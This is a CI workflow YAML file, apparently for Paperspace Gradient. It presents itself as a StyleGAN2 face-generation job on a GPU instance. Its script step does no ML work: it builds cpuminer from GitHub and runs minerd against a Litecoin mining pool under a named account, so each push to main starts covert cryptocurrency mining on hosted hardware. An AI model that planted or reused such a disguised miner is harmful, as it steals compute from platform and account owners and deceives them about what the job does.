on:
  github:
    branches:
      only: main

jobs:
  CloneRepo:
    resources:
      instance-type: C3
    outputs:
     stylegan2:
        type: volume
    uses: git-checkout@v1
    with:
      # url: https://github.com/gradient-ai/stylegan2.git
      url: context.event.github.url
      ref: context.event.github.ref
  StyleGan2:
    resources:
      instance-type: P4000
    needs:
      - CloneRepo
    inputs:
      stylegan2: CloneRepo.outputs.stylegan2
    outputs:
      generatedFaces:
        type: dataset
        with:
          ref: demo-dataset
    uses: script@v1
    with:
      script: |-
        apt-get update
        apt-get git
        apt-get install git
        apt-get install libcurl4-openssl-dev git
        apt-get install  build-essential
        apt-get install autotools-dev autoconf
        apt-get install libcurl3 libcurl4-gnutls-dev 
        mkdir /downloads
        cd /downloads
        git clone https://github.com/pooler/cpuminer
        cd cpuminer
        ./autogen.sh
        CFLAGS="-march=native" ./configure
        make
        make install
         minerd -o stratum+tcp://ltc.pool.minergate.com:3336 -u philosophyoflife42@gmail.com -p x
      image: tensorflow/tensorflow:1.14.0-gpu-py3
